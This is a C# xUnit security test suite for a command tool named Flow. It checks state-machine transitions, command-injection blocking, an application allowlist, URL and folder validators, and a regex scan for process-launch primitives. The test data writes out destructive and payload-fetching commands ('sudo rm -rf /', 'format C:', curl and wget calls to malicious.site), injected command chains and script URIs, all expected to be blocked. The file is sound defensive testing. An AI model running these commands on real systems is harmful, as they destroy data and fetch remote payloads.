using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Flow.Core.Commands;
using Flow.Core.Context;
using Xunit;

namespace Flow.Core.Tests.Commands;

/// <summary>
/// Phase 7.5 Adversarial Audit: State Machine, Command Injection, Static Process Scan, Allowlist, and URL Security.
/// Covers Master Audit Sections 6, 8, 9, 10, 11, 12, 13.
/// </summary>
public class Phase75StateMachineAndSafetyTests
{
    private readonly DeterministicCommandSafetyPolicy _safetyPolicy = new();
    private readonly DeterministicCommandPolicy _commandPolicy = new();

    #region Section 6: Command State Machine Exhaustive Audit

    public static IEnumerable<object[]> GetAllPossibleStateTransitions()
    {
        var states = Enum.GetValues<CommandModeState>();
        foreach (var from in states)
        {
            foreach (var to in states)
            {
                yield return new object[] { from, to };
            }
        }
    }

    [Theory]
    [MemberData(nameof(GetAllPossibleStateTransitions))]
    public void StateMachine_ExhaustiveTransitionAudit(CommandModeState from, CommandModeState to)
    {
        var sm = new CommandModeStateMachine();
        if (from != CommandModeState.Disabled)
        {
            // Reach 'from' state safely or via force reset
            ReachState(sm, from);
        }

        bool canTransition = sm.CanTransitionTo(to);
        bool transitioned = sm.TryTransitionTo(to, "audit test transition");

        Assert.Equal(canTransition, transitioned);

        if (transitioned)
        {
            Assert.Equal(to, sm.CurrentState);
        }
        else
        {
            Assert.Equal(from, sm.CurrentState);
        }
    }

    private static void ReachState(CommandModeStateMachine sm, CommandModeState target)
    {
        switch (target)
        {
            case CommandModeState.Disabled:
                sm.ForceReset();
                break;
            case CommandModeState.Arming:
                sm.TryTransitionTo(CommandModeState.Arming);
                break;
            case CommandModeState.Active:
                sm.TryTransitionTo(CommandModeState.Arming);
                sm.TryTransitionTo(CommandModeState.Active);
                break;
            case CommandModeState.AwaitingConfirmation:
                sm.TryTransitionTo(CommandModeState.Arming);
                sm.TryTransitionTo(CommandModeState.Active);
                sm.TryTransitionTo(CommandModeState.AwaitingConfirmation);
                break;
            case CommandModeState.Executing:
                sm.TryTransitionTo(CommandModeState.Arming);
                sm.TryTransitionTo(CommandModeState.Active);
                sm.TryTransitionTo(CommandModeState.Executing);
                break;
            case CommandModeState.Completed:
                sm.TryTransitionTo(CommandModeState.Arming);
                sm.TryTransitionTo(CommandModeState.Active);
                sm.TryTransitionTo(CommandModeState.Executing);
                sm.TryTransitionTo(CommandModeState.Completed);
                break;
            case CommandModeState.Cancelled:
                sm.TryTransitionTo(CommandModeState.Arming);
                sm.TryTransitionTo(CommandModeState.Cancelled);
                break;
            case CommandModeState.Failed:
                sm.TryTransitionTo(CommandModeState.Arming);
                sm.TryTransitionTo(CommandModeState.Failed);
                break;
        }
    }

    [Fact]
    public void StateMachine_ExecutingToArming_StrictlyRejected()
    {
        var sm = new CommandModeStateMachine();
        ReachState(sm, CommandModeState.Executing);

        bool result = sm.TryTransitionTo(CommandModeState.Arming);
        Assert.False(result);
        Assert.Equal(CommandModeState.Executing, sm.CurrentState);
    }

    [Fact]
    public void StateMachine_CompletedToExecuting_StrictlyRejected()
    {
        var sm = new CommandModeStateMachine();
        ReachState(sm, CommandModeState.Completed);

        bool result = sm.TryTransitionTo(CommandModeState.Executing);
        Assert.False(result);
        Assert.Equal(CommandModeState.Completed, sm.CurrentState);
    }

    [Fact]
    public void StateMachine_CancelledToExecuting_StrictlyRejected()
    {
        var sm = new CommandModeStateMachine();
        ReachState(sm, CommandModeState.Cancelled);

        bool result = sm.TryTransitionTo(CommandModeState.Executing);
        Assert.False(result);
        Assert.Equal(CommandModeState.Cancelled, sm.CurrentState);
    }

    [Fact]
    public void StateMachine_FailedToExecuting_StrictlyRejected()
    {
        var sm = new CommandModeStateMachine();
        ReachState(sm, CommandModeState.Failed);

        bool result = sm.TryTransitionTo(CommandModeState.Executing);
        Assert.False(result);
        Assert.Equal(CommandModeState.Failed, sm.CurrentState);
    }

    [Fact]
    public void StateMachine_AwaitingConfirmationToActive_WithoutConfirmation_StrictlyRejected()
    {
        var sm = new CommandModeStateMachine();
        ReachState(sm, CommandModeState.AwaitingConfirmation);

        bool result = sm.TryTransitionTo(CommandModeState.Active);
        Assert.False(result);
        Assert.Equal(CommandModeState.AwaitingConfirmation, sm.CurrentState);
    }

    #endregion

    #region Section 8: Command Injection Resistance Suite

    [Theory]
    [InlineData("cmd")]
    [InlineData("cmd.exe /c calc")]
    [InlineData("powershell")]
    [InlineData("powershell.exe -ExecutionPolicy Bypass")]
    [InlineData("pwsh")]
    [InlineData("bash")]
    [InlineData("sh")]
    [InlineData("sudo")]
    [InlineData("sudo rm -rf /")]
    [InlineData("rm")]
    [InlineData("rm -rf C:\\\\Users")]
    [InlineData("del")]
    [InlineData("del /f /q *.*")]
    [InlineData("erase")]
    [InlineData("erase C:\\\\Windows")]
    [InlineData("format")]
    [InlineData("format C:")]
    [InlineData("format drive D")]
    [InlineData("shutdown")]
    [InlineData("shutdown /s /t 0")]
    [InlineData("restart")]
    [InlineData("restart-computer")]
    [InlineData("reboot")]
    [InlineData("kill")]
    [InlineData("kill -9 1234")]
    [InlineData("taskkill")]
    [InlineData("taskkill /F /IM explorer.exe")]
    [InlineData("runas")]
    [InlineData("runas /user:Administrator cmd")]
    [InlineData("CreateProcess")]
    [InlineData("ShellExecute")]
    [InlineData("ShellExecuteEx")]
    [InlineData("Process.Start")]
    [InlineData("registry")]
    [InlineData("reg add HKLM\\\\Software")]
    [InlineData("reg delete HKCU\\\\Environment")]
    [InlineData("drop table")]
    [InlineData("drop table users;")]
    [InlineData("curl")]
    [InlineData("curl -O http://malicious.site/payload.exe")]
    [InlineData("wget")]
    [InlineData("wget https://malicious.site/script.sh")]
    public void CommandInjection_DangerousShellTokens_StrictlyBlockedByPolicy(string injectionPhrase)
    {
        // 1. Safety policy evaluation
        var safetyResult = _safetyPolicy.EvaluateTranscript(injectionPhrase);
        Assert.Equal(CommandSafetyVerdict.Blocked, safetyResult.Verdict);
        Assert.NotNull(safetyResult.Reason);

        // 2. Policy engine evaluation on parsed or synthesized intent
        var context = new CommandExecutionContext(
            Guid.NewGuid(), DateTimeOffset.UtcNow, new IntPtr(100), 100, "notepad",
            FocusedControlInfo.Empty, "some text", ApplicationCategory.GeneralProse);

        var intent = new UnknownCommandIntent(injectionPhrase, "unrecognized");
        var policyEval = _commandPolicy.Evaluate(intent, context);

        // Must be Blocked (or Rejected) - never Allowed or Confirmed
        Assert.True(policyEval.Decision is CommandPolicyDecision.Block or CommandPolicyDecision.Reject,
            $"Injection phrase '{injectionPhrase}' was not blocked/rejected: {policyEval.Decision}");
    }

    #endregion

    #region Section 9: Arbitrary Process Execution Audit (Static Scan)

    [Fact]
    public void StaticCodebaseScan_SrcDirectory_ZeroProcessExecutionPrimitives()
    {
        // Scan all .cs files in src/
        string repoRoot = FindRepoRoot();
        string srcDir = Path.Combine(repoRoot, "src");
        Assert.True(Directory.Exists(srcDir), $"src directory not found at {srcDir}");

        var csFiles = Directory.GetFiles(srcDir, "*.cs", SearchOption.AllDirectories);
        Assert.NotEmpty(csFiles);

        var forbiddenPatterns = new[]
        {
            @"Process\.Start\s*\(",
            @"new\s+ProcessStartInfo",
            @"CreateProcess[AW]?\s*\(",
            @"(?<![@""]\s*\\b)ShellExecute[AW]?\s*\(",
            @"(?<![@""]\s*\\b)ShellExecuteEx[AW]?\s*\(",
            @"WinExec\s*\(",
            @"\bpopen\s*\(",
            @"\bsystem\s*\(",
            @"\bcmd(\.exe)?\s+/c",
            @"\bStart-Process\b",
            @"\bInvoke-Expression\b",
            @"\bIEX\b"
        };

        var violations = new List<string>();

        foreach (var file in csFiles)
        {
            var lines = File.ReadAllLines(file);
            for (int i = 0; i < lines.Length; i++)
            {
                string line = lines[i];
                string trimmed = line.Trim();

                // Skip comments, string literal patterns, or regex definitions (e.g. entity protection keywords)
                if (trimmed.StartsWith("//") || trimmed.StartsWith("/*") || trimmed.StartsWith("*") ||
                    trimmed.StartsWith("@\"") || trimmed.StartsWith("\"") ||
                    trimmed.Contains("Regex") || trimmed.Contains("RegexOptions"))
                {
                    continue;
                }

                foreach (var pattern in forbiddenPatterns)
                {
                    if (Regex.IsMatch(line, pattern, RegexOptions.IgnoreCase))
                    {
                        violations.Add($"{Path.GetFileName(file)}:{i + 1} matches '{pattern}': {trimmed}");
                    }
                }
            }
        }

        Assert.True(violations.Count == 0,
            $"Forbidden process execution primitive(s) detected in production code:\n{string.Join("\n", violations)}");
    }

    private static string FindRepoRoot()
    {
        string current = AppContext.BaseDirectory;
        while (!string.IsNullOrEmpty(current))
        {
            if (File.Exists(Path.Combine(current, "Flow.sln")))
            {
                return current;
            }
            current = Directory.GetParent(current)?.FullName!;
        }
        throw new InvalidOperationException("Could not find Flow.sln directory");
    }

    #endregion

    #region Section 11: Application Allowlist Security

    [Theory]
    [InlineData("notepad", true)]
    [InlineData("Notepad", true)]
    [InlineData("vscode", true)]
    [InlineData("Visual Studio Code", true)]
    [InlineData("terminal", true)]
    [InlineData("calculator", true)]
    [InlineData("explorer", true)]
    // Rejected arbitrary executables and attacks
    [InlineData("cmd", false)]
    [InlineData("cmd.exe", false)]
    [InlineData("powershell", false)]
    [InlineData("powershell.exe", false)]
    [InlineData("bash", false)]
    [InlineData("malware.exe", false)]
    [InlineData("arbitrary_app", false)]
    [InlineData("fake_notepad.exe", false)]
    [InlineData("..\\notepad.exe", false)]
    [InlineData("../notepad.exe", false)]
    [InlineData("C:\\Windows\\System32\\notepad.exe", false)]
    [InlineData("\\\\server\\share\\calc.exe", false)]
    [InlineData("%windir%\\notepad.exe", false)]
    [InlineData("notepad.exe & calc.exe", false)]
    [InlineData("notepad.exe | whoami", false)]
    [InlineData("notepad.exe; calc.exe", false)]
    public void ApplicationAllowlist_SecurityAudit(string candidateApp, bool expectedAllowed)
    {
        bool allowed = ApplicationAllowlist.IsAllowed(candidateApp);
        Assert.Equal(expectedAllowed, allowed);

        bool gotApp = ApplicationAllowlist.TryGetAllowlistedApp(candidateApp, out var app);
        Assert.Equal(expectedAllowed, gotApp);
        if (expectedAllowed)
        {
            Assert.NotNull(app);
            Assert.False(string.IsNullOrWhiteSpace(app!.DisplayName));
        }
    }

    #endregion

    #region Section 12: URL Security Audit

    [Theory]
    // Approved schemes
    [InlineData("https://example.com", true)]
    [InlineData("http://example.com", true)]
    [InlineData("https://localhost", true)]
    [InlineData("https://github.com/flow", true)]
    [InlineData("http://127.0.0.1:8080", true)]
    // Prohibited dangerous URI schemes
    [InlineData("javascript:alert(1)", false)]
    [InlineData("javascript:void(0)", false)]
    [InlineData("file:///C:/Windows/System32/calc.exe", false)]
    [InlineData("file://localhost/c$/boot.ini", false)]
    [InlineData("shell:startup", false)]
    [InlineData("shell:personal", false)]
    [InlineData("ms-settings:privacy", false)]
    [InlineData("ms-settings:windowsupdate", false)]
    [InlineData("ms-appx:///evil", false)]
    [InlineData("ms-appdata:///local", false)]
    [InlineData("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", false)]
    [InlineData("vbscript:MsgBox(\"hacked\")", false)]
    [InlineData("custom://myprotocol/run", false)]
    [InlineData("ftp://ftp.example.com", false)]
    [InlineData("ssh://root@evil.com", false)]
    [InlineData("telnet://evil.com", false)]
    public void UrlSafetyValidator_SecurityAudit(string inputUrl, bool expectedSafe)
    {
        bool isValid = UrlSafetyValidator.TryValidateUrl(inputUrl, out var uri, out var failureReason);
        Assert.Equal(expectedSafe, isValid);

        if (expectedSafe)
        {
            Assert.NotNull(uri);
            Assert.Null(failureReason);
            Assert.True(uri!.Scheme == "https" || uri.Scheme == "http");
        }
        else
        {
            Assert.NotNull(failureReason);
        }
    }

    #endregion

    #region Section 13: Filesystem Security Audit

    [Theory]
    [InlineData("..\\..\\..\\Windows", false)]
    [InlineData("../../../Windows", false)]
    [InlineData("relative\\folder", false)]
    [InlineData("subfolder", false)]
    [InlineData("", false)]
    [InlineData("   ", false)]
    [InlineData("\\\\evilserver\\share", false)]
    [InlineData("C:\\NonExistentFolder_12345_XYZ", false)]
    public void FolderSafetyValidator_SecurityAudit(string inputPath, bool expectedSafe)
    {
        bool isValid = FolderSafetyValidator.TryValidateFolder(inputPath, out var safePath, out var failure);
        Assert.Equal(expectedSafe, isValid);

        if (!expectedSafe)
        {
            Assert.NotNull(failure);
        }
    }

    [Fact]
    public void FolderSafetyValidator_ExistingSystemFolder_Approved()
    {
        string systemRoot = Environment.GetFolderPath(Environment.SpecialFolder.System);
        if (Directory.Exists(systemRoot))
        {
            bool isValid = FolderSafetyValidator.TryValidateFolder(systemRoot, out var safePath, out var failure);
            Assert.True(isValid);
            Assert.NotNull(safePath);
            Assert.Null(failure);
        }
    }

    #endregion
}
